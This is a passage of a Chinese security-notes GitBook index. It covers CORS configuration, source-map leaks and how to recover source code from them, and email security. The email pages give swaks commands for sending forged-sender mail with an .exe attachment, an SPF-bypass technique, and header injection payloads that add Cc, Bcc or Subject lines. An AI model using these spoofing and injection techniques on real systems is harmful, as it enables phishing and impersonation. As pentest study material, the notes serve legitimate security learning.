(origin != null && !Arrays.asList(authhosts).contains(origin)) { httpresponse.sendError(403); return; } else { for (int i = 0; i 另一种配置方式 把 cors-filter-1.7.jar 与 java-property-utils-1.9.jar 这两个文件放到 tomcat 的 lib 目录下 在 tomcat 的 web.xml 中配置 CORS com.thetransactioncompany.cors.CORSFilter cors.allowOrigin * --> *.xxx.com,http://10.130.222.222:6500 cors.exposedHeaders Set-Cookie cors.supportsCredentials true CORS /* 0x00 前人栽树 跨域资源共享 CORS 详解 - 阮一峰的网络日志 (ruanyifeng.com) -- 可以顺便看看评论 绕过浏览器 SOP，跨站窃取信息：CORS 配置安全漏洞报告及最佳部署实践 | Jianjun Chen | International Computer Science Institute | Network Security -- 推荐阅读 https://web.dev/cross-origin-resource-sharing/ https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS CVE-2018-8014，https://nvd.nist.gov/vuln/detail/CVE-2018-8014 nginx - 前端常见跨域解决方案（全） - 个人文章 - SegmentFault 思否 CORS 介绍及其漏洞检测 - 知乎 (zhihu.com) CORS 跨域漏洞修复 - 不愿透露姓名的汤姆猫 - 博客园 (cnblogs.com) (82 条消息) CORS(跨域资源共享)漏洞解决方法cors 漏洞修复追逐梦想永不停的博客-CSDN 博客 -- 测试方法说明有误 【漏洞利用】跨域资源共享（CORS）漏洞详解 - GorillaLee - 博客园 (cnblogs.com) CORS 完全手冊（一）：為什麼會發生 CORS 錯誤？ · Issue #68 · aszx87410/blog · GitHub (82 条消息) Nginx 跨域配置_程序员小强的博客-CSDN 博客 https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-14 18:29:10 "},"web/Source Map 泄露.html":{"url":"web/Source Map 泄露.html","title":"Source Map 泄露","keywords":"","body":"0x01 漏洞描述 概述 Webpack 是一个 JavaScript 应用程序的静态资源打包器（module bundler）。它会在内部从一个或多个入口点构建一个 依赖图(dependency graph)，其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 bundle，它们均为静态资源，用于展示你的内容。 官方文档：https://webpack.docschina.org/concepts/。当然我们主要不是学习 webpack，知道它是什么就可以了，后续有开发要求再去读文档吧。 正常来讲前端代码根本不存在什么泄露一说，因为都说了是前端代码咯，本来就是可见的。由于网络安全越来越重要，一般生产环境中的 JavsScript 代码都是经过压缩和混淆的，所以可读性大大降低，这也提升了从前端的角度挖取更多信息的门槛。 大部分 Vue 等应用项目会使用 Webpack 进行打包，如果没有正确配置，就会导致项目源码泄露，可能泄露的各种信息如 API、加密算法、管理员邮箱、内部功能等等。 简单来说，Source Map 就是一个信息文件，里面储存着位置信息。转换后的代码的每一个位置，所对应的转换前的位置。 有了它，出错的时候，Debug 工具将直接显示原始代码，而不是转换后的代码，这给开发者带来了很大方便。 通过 Source Map 可以还原前端代码，恢复代码的可读性，就相当于可以反压缩和混淆。可以非常清晰地了解应用的前端业务，包括接口信息，如果前端包含加解密的逻辑的话，也非常有利于攻击者进行破解。 漏洞挖掘 手工挖掘 使用 Webpack 打包应用程序会在网站 js 同目录下生成 js.map 文件。 打开网站，F12 打开开发者工具找到含 .map 的 js 页面，进入到一个 *.js 的页面查看源码。 后缀加上 .map 访问，会打开对应的 map 页面或直接下载 590-509fef9ed53df815.js.map 将获取到 Source Map 就可以对 js 进行还原。 使用工具 Xray -- 检测，dirscan/sourcemap/default SourceDetector Chrome extension，用于发现源码文件(*.map) -- 检测 reverse-sourcemap -- 还原 SourceDetector 检测插件 SourceDetector 是一个谷歌浏览器插件，此插件可以自动的判断网站是否存在 js.map 文件。 源码：SunHuawei/SourceDetector 编译好的：Lz1y/SourceDetector-dist 备份： 下载 SourceDetector.zip 然后解压，谷歌浏览器添加扩展程序。 源码安装 下载安装 git clone https://github.com/SunHuawei/SourceDetector.git cd SourceDetector npm install bower install gulp 打开 Chrome 设置-扩展程序 点击\"加载已解压的扩展程序...\" 选择 path/to/source-detector/dist 目录 通过 Source Map 还原 JS reverse-sourcemap 这个工具，两年前发布的，居然文件和目录都能全部还原出来，牛逼。 全局安装 npm install --global reverse-sourcemap 安装目录：D:\\Java\\nvm\\v16.17.0\\node_modules\\reverse-sourcemap 然后（ -o 后面跟的是还原后的目录） reverse-sourcemap -o ./ -v 590-509fef9ed53df815.js.map 完美还原，反正就是牛！ PS C:\\Users\\xxx\\Desktop\\test> tree 卷 Windows-SSD 的文件夹 PATH 列表 卷序列号为 307E-ED05 C:. └─webpack └─_N_E └─packages └─frontend └─src ├─common │ └─helpers └─react ├─gwizzy │ ├─asyncHandlers │ ├─components │ │ └─ConversionWizard │ ├─helpers │ └─schema └─shared └─helpers 源码： 修复方式 案例查看：记录某一天安服仔的漏洞挖掘过程 临时的解决方法就是删除代码目录下的 xxx.js.map 文件； 永久的解决方法就是在 build 的时候禁用产生 map 文件的功能 在 scripts/build 下的 build.js 文件中添加如下配置： process.env.GENERATE_SOURCEMAP = 'false'; 重新 build 就不会再产生 Source Map 文件了 0x02 JavaScript Source Map 详解 jQuery 1.9发布。这是 2.0 版之前的最后一个新版本，有很多新功能，其中一个就是支持 Source Map。 访问 http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js，打开压缩后的版本，滚动到底部，你可以看到最后一行是这样的： //@ sourceMappingURL=jquery.min.map 这就是 Source Map。它是一个独立的 map 文件，与源码在同一个目录下，你可以点击进去，看看它的样子。 从源码转换讲起 JavaScript 脚本正变得越来越复杂。大部分源码（尤其是各种函数库和框架）都要经过转换，才能投入生产环境。 常见的源码转换，主要是以下三种情况： （1）压缩，减小体积。比如 jQuery 1.9 的源码，压缩前是 252KB，压缩后是 32KB。 （2）多个文件合并，减少 HTTP 请求数。 （3）其他语言编译成 JavaScript。最常见的例子就是 CoffeeScript。 这三种情况，都使得实际运行的代码不同于开发代码，除错（debug）变得困难重重。 通常，JavaScript 的解释器会告诉你，第几行第几列代码出错。但是，这对于转换后的代码毫无用处。举例来说，jQuery 1.9 压缩后只有 3 行，每行 3 万个字符，所有内部变量都改了名字。你看着报错信息，感到毫无头绪，根本不知道它所对应的原始位置。 这就是 Source map 想要解决的问题。 什么是 Source Map 简单说，Source map 就是一个信息文件，里面储存着位置信息。也就是说，转换后的代码的每一个位置，所对应的转换前的位置。 有了它，出错的时候，除错工具将直接显示原始代码，而不是转换后的代码。这无疑给开发者带来了很大方便。 ​ 目前，暂时只有 Chrome 浏览器支持这个功能。在 Developer Tools 的 Setting 设置中，确认选中\"Enable source maps\"。 如何启用 Source Map 只要在转换后的代码尾部，加上一行就可以了。 //@ sourceMappingURL=/path/to/file.js.map map 文件可以放在网络上，也可以放在本地文件系统。 如何生成 Source Map 最常用的方法是使用 Google 的 Closure 编译器。 生成命令的格式如下： java -jar compiler.jar --js script.js --create_source_map ./script-min.js.map --source_map_format=V3 --js_output_file script-min.js 各个参数的意义如下： - js： 转换前的代码文件 - create_source_map： 生成的 source map 文件 - source_map_format：source map 的版本，目前一律采用 V3。 - js_output_file： 转换后的代码文件。 其他的生成方法可以参考这篇文章。 Source Map 的格式 打开 Source map 文件，它大概是这个样子： { 　　　　version : 3, 　　　　file: \"out.js\", 　　　　sourceRoot : \"\", 　　　　sources: [\"foo.js\", \"bar.js\"], 　　　　names: [\"src\", \"maps\", \"are\", \"fun\"], 　　　　mappings: \"AAgBC,SAAQ,CAAEA\" } 整个文件就是一个 JavaScript 对象，可以被解释器读取。它主要有以下几个属性： - version：Source map 的版本，目前为 3。 - file：转换后的文件名。 - sourceRoot：转换前的文件所在的目录。如果与转换前的文件在同一目录，该项为空。 - sources：转换前的文件。该项是一个数组，表示可能存在多个文件合并。 - names：转换前的所有变量名和属性名。 - mappings：记录位置信息的字符串，下文详细介绍。 mappings 属性 下面才是真正有趣的部分：两个文件的各个位置是如何一一对应的。 关键就是 map 文件的 mappings 属性。这是一个很长的字符串，它分成三层。 第一层是行对应，以分号（;）表示，每个分号对应转换后源码的一行。所以，第一个分号前的内容，就对应源码的第一行，以此类推。 第二层是位置对应，以逗号（,）表示，每个逗号对应转换后源码的一个位置。所以，第一个逗号前的内容，就对应该行源码的第一个位置，以此类推。 第三层是位置转换，以 VLQ 编码表示，代表该位置对应的转换前的源码位置。 举例来说，假定 mappings 属性的内容如下： mappings:\"AAAAA,BBBBB;CCCCC\" 就表示，转换后的源码分成两行，第一行有两个位置，第二行有一个位置。 说明：mappings:\"AAAAA,BBBBB;CCCCC\" 并不是按这个字母每一位的作用，而是需要先把内容变成二进制再根据 VLQ 规则解码出来后的第一位第二位才是每一位作用。实际的 mappings 中每一小段可能存在超过 5 个字符。 位置对应的原理 每个位置使用五位，表示五个字段。 从左边算起， 第一位，表示这个位置在（转换后的代码的）的第几列，是和前一个位置的相对列数量。 第二位，表示这个位置属于 sources 属性中的哪一个文件。 第三位，表示这个位置属于转换前代码的第几行。 第四位，表示这个位置属于转换前代码的第几列。 第五位，表示这个位置属于 names 属性中的哪一个变量。 有几点需要说明。首先，所有的值都是以 0 作为基数的。其次，第五位不是必需的，如果该位置没有对应 names 属性中的变量，可以省略第五位。再次，每一位都采用 VLQ 编码表示；由于 VLQ 编码是变长的，所以每一位可以由多个字符构成。 如果某个位置是 AAAAA，由于 A 在 VLQ 编码中表示 0，因此这个位置的五个位实际上都是 0。它的意思是，该位置在转换后代码的第 0 列，对应 sources 属性中第 0 个文件，属于转换前代码的第 0 行第 0 列，对应 names 属性中的第 0 个变量。 VLQ 编码 最后，如何用 VLQ 编码表示数值。 这种编码最早用于 MIDI 文件，后来被多种格式采用。它的特点就是可以非常精简地表示很大的数值。 VLQ 编码是变长的。如果（整）数值在-15 到 +15 之间（含两个端点），用一个字符表示；超出这个范围，就需要用多个字符表示。它规定，每个字符使用 6 个两进制位，正好可以借用 Base 64 编码的字符表。 在这 6 个位中，左边的第一位（最高位）表示是否\"连续\"（continuation）。如果是 1，代表这 ６ 个位后面的 6 个位也属于同一个数；如果是 0，表示该数值到这 6 个位结束。 Continuation |　　　　　Sign |　　　　　| V　　　　　V １０１０１１ 这 6 个位中的右边最后一位（最低位）的含义，取决于这 6 个位是否是某个数值的 VLQ 编码的第一个字符。如果是的，这个位代表\"符号\"（sign），0 为正，1 为负（Source map 的符号固定为 0）；如果不是，这个位没有特殊含义，被算作数值的一部分。 VLQ 编码：实例 下面看一个例子，如何对数值 16 进行 VLQ 编码。 第一步，将 16 改写成二进制形式 10000。 第二步，在最右边补充符号位。因为 16 大于 0，所以符号位为 0，整个数变成 100000。 第三步，从右边的最低位开始，将整个数每隔 5 位，进行分段，即变成 1 和 00000 两段。如果最高位所在的段不足 5 位，则前面补 0，因此两段变成 00001 和 00000。 第四步，将两段的顺序倒过来，即 00000 和 00001。 第五步，在每一段的最前面添加一个\"连续位\"，除了最后一段为 0【上面说了 0 表示不连续】，其他都为 1，即变成 100000 和 000001。 第六步，将每一段转成 Base 64 编码。 查表可知，100000 为 g，000001 为 B。因此，数值 16 的 VLQ 编码为 gB。上面的过程，看上去好像很复杂，做起来其实很简单，具体的实现请看官方的 base64-vlq.js 文件，里面有详细的注释。 0x00 前人栽树 JavaScript Source Map 详解 -- 推荐阅读 谈谈我是如何获得知乎的前端源码的 - 知乎 (zhihu.com) -- 推荐阅读 https://github.com/mozilla/source-map (83 条消息) sourcemap 文件泄露漏洞js.map 文件泄露小心灵呀的博客-CSDN 博客 -- 推荐阅读 hey,我能看到你的源码哎 -- 大佬 http://www.luckysec.cn/posts/531d91e3.html#toc-heading-3 https://github.com/D-kylin/note/blob/master/VLQ%E7%BC%96%E7%A0%81.md Introduction To JavaScript Source Maps Source Map Revision 3 Proposal Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-16 23:46:49 "},"email/a-readme.html":{"url":"email/a-readme.html","title":"Email","keywords":"","body":"关于邮件的知识合集~ Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-14 19:28:32 "},"email/Attack Email.html":{"url":"email/Attack Email.html","title":"Attack Email","keywords":"","body":"邮件字段 域名 含义 添加者 Received 传输路径 各级邮件服务器 Return-Path 回复地址 目标邮件服务器 Delivered-To 发送地址 目标邮件服务器 Reply-To 回复地址 邮件的创建者 From 发件人地址 邮件的创建者 To 收件人地址 邮件的创建者 Cc 抄送地址 邮件的创建者 Bcc 暗送地址 邮件的创建者 Date 日期和时间 邮件的创建者 Subject 主题 邮件的创建者 Message-ID 消息ID 邮件的创建者 MIME-Version MIME版本 邮件的创建者 Content-Type 内容的类型 邮件的创建者 Content-Transfer-Encoding 内容的传输编码方式 邮件的创建者 swaks swaks - Swiss Army Knife SMTP, the all-purpose smtp transaction tester. swaks堪称SMTP协议的瑞士军刀，使用它我们可以灵活的操作 SMTP 协议报文。 常用指令 --to user@example.com：收件人 --from me@example.com：发件人 --server test-server.example.com：smtp 服务器 -au me@example.com：邮件用户 -ap xxxxpassword：密码 --body [string or file path]：邮件正文 --ehlo [helo-string]：伪造 ehlo 头信息 --header [header-and-data]：伪造 From、Subject、Message-Id、X-Mailer 等头信息，如 --header'Subject：邮件主题内容' --data [data-portion]：伪造 DATA 的全部内容，可直接将邮件源码作为选项 --attach [attachment-specification]：添加附件 自定义 header 字段 swaks 支持自定义某些 Header，参数如下： swaks --header- 如果想去除 Mailer 特征，就可以这么做： swaks --header-X-Mailer gmail.com 伪造 header-from --h-From: '管理员' 发送邮件原文和添加附件 --data 参数 --attach 参数 swaks --to 要发给的目标@gmail.com --from 你拥有的邮箱@xxxmail.net --ehlo gmail.com（需要攻击的域名） --data Test.eml（邮件原文。可以先用邮箱生成再导出邮件原文） --attach /tmp/附件.exe --header-X-Mailer gmail.com（需要攻击的域名） --server xxxmail.net（你邮箱的服务器） -p 25 -au 你拥有的邮箱账号@xxxmail.net -ap zqD2q7wkKbxxsdadda（密码） python 实现 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib from email.mime.text import MIMEText from email.header import Header mail_host=\"mail.smtp2go.com\" mail_user=\"\" mail_pass=\"\" sender = 'test@smtp2go.com' receivers = ['target@gmail.com'] message = MIMEText('Hello World', 'plain', 'utf-8') message['From'] = Header(\"admin@qq.com\", 'utf-8') message['To'] = Header(receivers[0], 'utf-8') subject = 'SMTP 邮件测试' message['Subject'] = Header(subject, 'utf-8') try: smtpObj = smtplib.SMTP() smtpObj.connect(mail_host, 25) smtpObj.login(mail_user,mail_pass) smtpObj.sendmail(sender, receivers, message.as_string()) print \"Success\" except smtplib.SMTPException: print \"Error\" smtp2go smtp2go 主要是相当于邮件托管，可以分发子账户进行发送。 地址：https://support.smtp2go.com/hc/en-gb （邮箱注册）普通账户可以免费发 1000 封邮件，需要境外手机号码（接码平台）。 分配好账户后，可以通过 swaks 进行登录发送邮件： swaks --to evilxxx@gmail.com --from 需要伪造的@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap SPF 绕过 swaks --to payloads@aliyun.com --from xx@smtp2go.com --h-From: '管理员' --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap 由于邮件显示的是 Header 中的 From 不是 smtp.from，因此可以将 smtp.from 设置为正常的邮件服务器地址，伪造一个 Mail.From 即可。 但是现在这种邮箱都会显示代发，又或者 mail.from（header.from） 和 smtp.from 不一致的话会直接被邮件服务器拒收。 邮件注入 邮件注入和 HTTP 头部注入相似，这种漏洞发生在一个编程语言嵌入另一个，比如 mysql 嵌入php。 对于邮件头部的字段其实就是换行符 0x0A 或者 0x0D0x0A 分割 ，在绝大部分系统里面不是 \\n 就是 \\r\\n，所以就可以注入了。 电子邮件注入是针对邮件功能的一种攻击类型。它允许恶意攻击者注入任何邮件头字段，BCC、CC、主题等，它允许黑客通过注入手段从受害者的邮件服务器发送垃圾邮件。它可能会影响任何从用户 UI 接收消息并发送电子邮件消息的应用程序。这种攻击的主要原因是不适当的用户输入验证或应用程序根本没有验证和过滤机制。 注入分类 发件人，主题，内容 发件人修改 本来发件人就可控，或者在别的字段里重复添加，但是要看邮件服务器针对多个 from 是如何实现的，是取第一个，还是取最后一个，还是如何操作。 from:sender@domain.com%0Afrom:attacker@domain.com 收件人、抄送人注入（Cc/Bcc注入） 在发送者字段(sender)后注入 Cc 和 Bcc 参数 From:sender@domain.com%0ACc:recipient@domain.com%0ABcc:recipient1@domain.com 所以现在，消息将被发送到 recipient 和 recipient1 账户。 主题注入 攻击者注入的假的主题 subject 将被添加到原来的主题中并且在某些情况下将取代原本的主题 subject，这取决于邮件服务行为。即代码编写的容错性，当参数中出现两个 subject 的时候代码是选择丢弃还是后者覆盖。 From:sender@domain.com%0ASubject:This’s%20Fake%20Subject 消息体注入 要注意 SMTP 的 Mail 格式，消息主题和头部 Header 之间有两个换行符(和 HTTP 是一样的)。 From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message. 假消息将被添加到原始消息中。 0x00 前人栽树 邮件注入攻击 Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-15 18:10:19 "},"email/邮件协议.html":{"url":"email/邮件协议.html","title":"邮件协议","keywords":"","body":"MIME 邮件格式 SMTP 发信 SPF What is SPF (Sender Policy Framework) 的缩写，一种以 IP 地址认证电子邮件发件人身份的技术，是非常高效的垃圾邮件解决方案。 接收邮件方会首先检查域名的 SPF 记录，来确定发件人的 IP 地址是否被包含在SPF记录里面，如果在，就认为是一封正确的邮件，否则会认为是一封伪造的邮件进行退回。 借助 SPF 防范仿冒邮件和垃圾邮件 什么是 DNS SPF 记录？ SPF 记录是什么以及它如何工作：SPF 记录全解释 SPF 记录是什么样的？ 官方 SPF 记录文档 SPF 记录必须遵循一定的标准，以便服务器理解其内容。如下是 SPF 记录核心组成部分的示例： v=spf1 ip4=192.0.2.0 ip4=192.0.2.1 include:examplesender.email -all 这个例子让服务器知道这是什么类型的记录，声明对这个域被批准的 IP 地址和第三方，并告知服务器如何处理不符合要求的电子邮件。我们分别说明各组成部分是如何实现这一点的： v=spf1 告诉服务器这里包含一条 SPF 记录。每一条 SPF 记录都必须以这个字符串开始。 然后是 SPF 记录的“客人名单”部分，即授权 IP 地址。在本例中，SPF 记录告诉服务器，ip4=192.0.2.0 和 ip4=192.0.2.1 被授权代表该域发送电子邮件。 include:examplesender.net 是 “include”（包含）标记的示例，该标记告诉服务器，有哪些第三方组织被授权代表该域发送电子邮件。这个标记表示，被包含域（examplesender.net）的 SPF 记录内容应被检查，其中包含的 IP 地址也应被视为已授权。一条 SPF 记录中可包含多个域，但这个标记仅适用于有效的域。 Finally, -all 告诉服务器，SPF 记录中未列出的地址没有被授权发送电子邮件并应被拒绝。 这里的其他可选项包括 ~all：表示未列出的电子邮件将被标记为不安全邮件或垃圾邮件，但仍会被接受；不那么常见的是 +all：表示任何服务器都可以代表该域发送电子邮件。 SPF Record evaluation 邮件服务器中的 SPF 模块在对 SPF 记录中的 terms 进行估值后，向邮件服务器返回认证 (authentication) 结果。 SPF 中有 2 种 terms：mechanisms 以及 modifiers。 SPF 认证结果为以下其中之一： None: 未能有效地解释域名，或者域名上未找到 SPF 记录； Neutral: 发起请求的主机的 IP 地址是否允许并未确定； Pass: 发起请求的主机的 IP 地址被允许； Fail: 发起请求的主机的 IP 地址不被允许； Softfail: 发起请求的主机的 IP 地址可能不被允许； Temperror: SPF 模块在检查时碰到临时网络错误； Permerror: 域名上发布的 SPF 无法解释。这种情况，域名管理员须修复此错误。 如果一直到 SPF 记录的末尾都没有找到匹配，返回 neutral。这是 SPF 估值的缺省值。 SPF qualifiers SPF qualifier 前置于 SPF mechanism，用来指定该 SPF mechanism 的估值结果。以下是所有的 qualifiers，以及对应的结果： \"+\" pass \"-\" fail \"~\" softfail \"?\" neutral SPF mechanisms 有两种 SPF mechanisms：基本 mechanisms 和指定发送者 mechanisms。 基本 mechanisms 有 all 和 include。 指定发送者 mechanisms 有 a，mx，ptr，ip4，ip6，和 exists。 include 可以让 SPF 记录把定义在另外一个 SPF 记录中的第三方 IP 地址包括进来。 要确保 SPF 记录有效，需要注意如下几点： 每个域不能关联多条 SPF 记录。 记录必须以 all 部分结束，或包含一个 redirect: 部分（表示该 SPF 记录由另一个域托管）。 SPF 记录不能包含大写字母。 SPF modifiers SPF 有两个 modifiers：redirect 和 exp。 SPF modifiers 是可选的。 每条 SPF record 中的任何 SPF modifier 只能够使用一次。 未知的 modifiers 会被忽略。 redirect=：在 domain 上面的 SPF 记录会代替当前的 SPF 记录。 exp=：如果 SPF 记录估值失败，并且存在 exp modifier，SPF 返回一个串来解释原因。 EXAMPLE 如： 如果 mail.smtp2go.com 是我的邮件服务器，那么 gmail 服务器收到的源 IP 也肯定是 mail.smtp2go.com 的 IP。 gmail 会校验邮件发送者的 IP 是否存在于 smtp.from 的域名 spf 配置列表里。 使用 Swaks swaks --to rvn0xsy@gmail.com --from admin@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap smtp.from 就是 admin@qq.com，和 mail.smtp2go.com 的 IP 肯定不同，所以 SPF 校验失败，而校验失败的邮件，会有很高的几率被扔到垃圾邮件中。 默认情况下，如果未设置 Mail.From 也就是邮件头的 From，则会使用 smtp.from 作为 Mail.From。 What is a DNS TXT record? DNS“文本”(TXT) 记录允许域管理员将文本输入到域名系统 (DNS) 中。TXT 记录最初的目的是用作存放人类可读笔记的地方。但是，现在也可以将一些机器可读的数据放入 TXT 记录中。 一个域可以有许多 TXT 记录。 https://www.cloudflare.com/zh-cn/learning/dns/dns-records/dns-txt-record/ TXT 记录示例： example.com record type value TTL @ TXT This is an awesome domain!Definitely not spammy. 32600 如今，DNS TXT 记录的两个最重要用途是防止垃圾邮件和域名所有权验证，尽管 TXT 记录最初并非为这些用途而设计。 查询 SPF # nslookup -q=txt 域名 # nslookup -type=txt 域名，如 huawei 的 PS C:\\Users\\Zzzz> nslookup -type=txt huawei.com 服务器: public1.114dns.com Address: 114.114.114.114 非权威应答: huawei.com text = \"MS=C4F6A693225CC6E058F6C9C39FD728C06C43E597\" huawei.com text = \"N3U/UqKcdI+8rthQEYTbph+m6MCg7+IW43PP5SuPxww=\" huawei.com text = \"v=spf1 ip4:45.249.212.32 ip4:45.249.212.35 ip4:45.249.212.255 ip4:45.249.212.187/29 ip4:45.249.212.191 ip4:168.195.93.47 ip4:185.176.79.56 ip4:119.8.179.247 ip4:119.8.89.136/31 ip4:119.8.89.135 ip4:119.8.177.36/31 ip4:119.8.177.38 -all\" huawei.com text = \"v=DMARC1;p=none;rua=mailto:dmarc@edm.huawei.com\" # 没有 SPF PS C:\\Users\\Zor0> nslookup 默认服务器: UnKnown Address: 192.168.170.16 > set q=txt > 5000.cn 服务器: UnKnown Address: 192.168.170.16 5000.cn primary name server = ns3.dns.com responsible mail addr = admin.dns.com serial = 1546510465 refresh = 7200 (2 hours) retry = 3600 (1 hour) expire = 1209600 (14 days) default TTL = 1800 (30 mins) > SPF 的绕过 我们只需要让 smtp.from 域名中配置的 txt 记录和发信 IP 一直那么就可以通过 SPF 校验。又或者有的域名没有配置 SPF 那么也可以进行伪造。 由于邮件显示的是 Header 中的 From 不是 smtp.from，因此可以将 smtp.from 设置为正常的邮件服务器地址，伪造一个 Mail.From 即可。 swaks --to payloads@aliyun.com --from xx@smtp2go.com --h-From: '管理员' --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap Gmail 接收到这封邮件后，会校验 --from xx@smtp2go.com 中的 smtp2go.com 是否等于 mail.smtp2go.com 的 IP，由于是相等的，所以完成了 SPF 的校验。 而 DKIM 是校验邮件完整性的，smtp2go 与 Gmail 直接使用的是 TLS，不会发生什么问题。 DKIM 与 DMARC 域名密钥识别邮件（DomainKeys Identified Mail，DKIM）是一套电子邮件认证机制，使用公开密钥加密邮件，以检测邮件是否是伪造或被篡改。【完整性校验】 通常发送方会在电子邮件的标头插入 DKIM-Signature 及电子签名, 而接收方则透过 DNS 查询得到公钥后进行验证。 DMARC 建立在发件人策略框架 (SPF)和域名识别邮件 (DKIM)协议之上。如果这两种身份验证方法都不通过，DMARC 策略将决定如何处理该消息。DMARC 要求域名所有者在 DNS 记录中设置 SPF 记录和 DKIM 记录，并明确声明对验证失败邮件的处理策略。 以上两种机制也是现有的电子邮件安全机制，不过以 SPF 策略为主。 0x00 前人栽树 https://payloads.online/archivers/2019-05-09/1/ https://saucer-man.com/information_security/452.html#cl-4 Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-15 17:59:50 "}}